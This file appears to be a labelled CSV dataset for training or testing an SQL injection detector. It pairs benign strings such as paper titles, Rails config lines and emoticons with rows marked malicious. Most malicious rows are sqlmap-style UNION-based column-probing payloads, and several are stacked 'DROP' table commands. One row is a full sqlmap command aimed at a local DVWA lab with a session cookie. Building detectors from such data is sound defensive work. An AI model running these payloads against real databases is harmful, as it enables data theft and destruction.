"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orderdate FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ZqxE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ordernumber FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Kmcc",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT data_type_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jkJD",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT publisherid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wcUO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT lake_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hfiC",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT course_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KahX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT questionid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Pkyw",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT student_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Bqzp",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT user_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- PSTM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT answerid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Mkav",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT hashtag FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mWXq",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT preference_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eQwo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT author_num FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yyjF",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT branch_num FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Kgvq",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT derived_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DUYa",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT factoryid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- EWhD",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT filterid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KCTD",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT log FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AdmS",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT pnumber FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- cISM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT specialtyid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GDDb",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT plugin_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uQTH",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT aa FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- CpCu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT file FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- jhfM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dept_number FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OkLE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT action_attribute_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bbqn",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cpr FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ATGR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT storeid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- HZMy",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT progenitor_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- paVE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT staff_number FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sVyX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT deptid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- OmJs",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT semester FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Iwhc",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT poi_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- GzZK",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT part_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- psqB",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cell_line_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SJjk",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT transaction_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vmjr",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT agentid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ASdL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT regionid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dYxm",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT token FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YwKe",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT serial_no FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zTfW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT experimental_data_set_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- IfGj",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cp_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TpdT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT the_geom FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SqIV",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT model FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Dxwh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT o_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YPaX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT personid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- pXkp",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT display_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- VqyO",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT salesperson_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- qIyf",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dependent_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ECPY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT license FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- dyOj",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT tablename FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- vaqi",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT employee_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Yaeo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT e_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- msnS",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_group FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zVIv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT location FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Peqi",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bb FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rYDY",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT languageid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- syhd",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT `int4` FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- oThk",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT msg_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YQcU",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT department FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gqIp",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT book_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- nmBc",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT ingredientid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wJfs",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT action_type_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- gKYr",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT maker FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Rexw",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT app FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KlYu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_customer FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- NOND",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT this FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aPhM",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT entry_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- blyh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT county_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ouRP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT protocol_type_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- BdHL",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT empnbr FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- DAfP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT unit_number FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- frqs",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bar FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- AmQE",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT studentid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- myqH",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dbid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LlKt",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT title_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KxXk",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT cname FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- LEjT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT emp_num FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- rgHv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT owner FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- TFTo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT course_name FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- KpHD",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT editionnumber FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Euxv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT sessionid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- mYZW",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mealid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yXLh",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT com_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aoru",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT text FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- zuDw",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT chip_layout_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- fQIT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT watchlistid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hEJH",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT qty FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ojKQ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT data_set_type_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- wjhb",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT orderid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- hPgJ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT module_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- eHqZ",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT c1 FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- aHLR",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT dlocation FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- sCPo",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT domainid FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- SnnK",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT course_no FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- yHkf",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT mgrssn FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- UwYu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT id_log FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uOps",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT access_control_type_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- WUDT",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT account_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bNeb",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT checking FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- Ahqz",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT protocol_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bwBG",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT request_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- bYGD",1,,
Human machine interface for lab abc computer applications,0,,
A survey of user opinion of computer system response time,0,,
The EPS user interface management system,0,,
System and human system engineering testing of EPS,0,,
Relation of user perceived response time to error measurement,0,,
The generation of random binary unordered trees,0,,
The intersection graph of paths in trees,0,,
Graph minors IV Widths of trees and well quasi ordering,0,,
Graph minors A survey,0,,
Allways is blue blue blue!!,0,,
maxWidth {Number} Max width. Minimum size is 320. Default undefined,0,,
hideCaption {Boolean} Default false,0,,
containerTagName {String} Default 'div',0,,
protocol {String} Instagram API script protocol. Default '' same as current protocol,0,,
"This property needed if you use device's file system, for example, Electron, Cordova apps",0,,
injectScript {Boolean} Default true,0,,
onLoading {Function},0,,
onSuccess {Function},0,,
onAfterRender {Function},0,,
version#3,0,,
version:1.0.0,0,,
"version:""1.0",0,,
sandbox:version:1.0.0,0,,
attachment:file.zip,0,,
r758,0,,
commit:c6f4d0fd,0,,
svn1|r758,0,,
hoge;DROP members --,1,,
1;DROP members --,1,,
#aaa;DROP members --,1,,
1;DROP table --,1,,
1;DROP users --,1,,
DROP master;--,1,,
DROP topic;--,1,,
DROP employ;--,1,,
DROP sample_table;--,1,,
_________________,0,,
(*___*),0,,
(*___*),0,,
(=^_^=),0,,
(_____),0,,
(o^^o)_,0,,
(_`__),0,,
(__),0,,
(___),0,,
_(^o^)_,0,,
_(*^^*)_,0,,
(__`_),0,,
(  _ ` )_,0,,
_(___*)_,0,,
(___),0,,
_(_^o^_)_,0,,
o(*^_^*)o,0,,
_(__)_,0,,
( ^__^__),0,,
(*___*),0,,
_(____),0,,
__ _ __,0,,
_______,0,,
_______,0,,
(____)_,0,,
_(___)_,0,,
require_relative 'boot',0,,
"require ""rails""",0,,
# Pick the frameworks you want:,0,,
"require ""active_model/railtie""",0,,
"require ""active_job/railtie""",0,,
"require ""active_record/railtie""",0,,
"require ""active_storage/engine""",0,,
"require ""action_controller/railtie""",0,,
"require ""action_mailer/railtie""",0,,
"require ""action_view/railtie""",0,,
"require ""action_cable/engine""",0,,
"# require ""sprockets/railtie""",0,,
"require ""rails/test_unit/railtie""",0,,
"require ""sprockets/railtie""",0,,
require_relative 'boot',0,,
"require ""rails""",0,,
# Pick the frameworks you want:,0,,
"require ""active_model/railtie""",0,,
"require ""active_job/railtie""",0,,
"require ""active_record/railtie""",0,,
"require ""active_storage/engine""",0,,
"require ""action_controller/railtie""",0,,
"require ""action_mailer/railtie""",0,,
"require ""action_view/railtie""",0,,
"require ""action_cable/engine""",0,,
"# require ""sprockets/railtie""",0,,
"require ""rails/test_unit/railtie""",0,,
"require ""sprockets/railtie""",0,,
"# Require the gems listed in Gemfile, including any gems",0,,
"# you've limited to :test, :development, or :production.",0,,
    config.assets.initialize_on_precompile = false,0,,
    # Settings in config/environments/* take precedence over those specified here.,0,,
    # Application configuration can go into files in config/initializers,0,,
    # -- all .rb files in that directory are automatically loaded after loading,0,,
    # the framework and any gems in your application.,0,,
    # Only loads a smaller set of middleware suitable for API only apps.,0,,
"    # Middleware like session, flash, cookies can be added back manually.",0,,
"    # Skip views, helpers and assets when generating a new resource.",0,,
end,0,,
"<!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01//EN"" ""http://www.w3.org/TR/html4/strict.dtd"">",0,,
"<HTML lang=""ja"">",0,,
<HEAD>,0,,
"<META http-equiv=""Content-Type"" content=""text/html;charset=Shift_JIS"">",0,,
"<META http-equiv=""Content-Style-Type"" content=""text/css"">",0,,
"<LINK rel=""stylesheet"" href=""style.css"" type=""text/css"">",0,,
"<LINK rel=""next"" href=""./next.html"">",0,,
</HEAD>,0,,
<BODY>,0,,
"sqlmap.py -o -u ""http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit""  --cookie=""PHPSESSID=db89cb39bb5dfd58197da6d105f143ab; security=high""",0,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT manufacturer_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YtLv",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT com_natur FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- twuX",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT review_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- XhXu",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xtipo_de_acao FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- ojbA",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT bookmark_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- QfWP",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT xequipe_padrao FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- YZKd",1,,
"  1' UNION ALL SELECT CONCAT(0x716b6b6a71,(CASE WHEN (EXISTS(SELECT faixas_id FROM performance_schema.events_waits_summary_by_instance)) THEN 1 ELSE 0 END),0x716a717a71),NULL-- uASU",1,,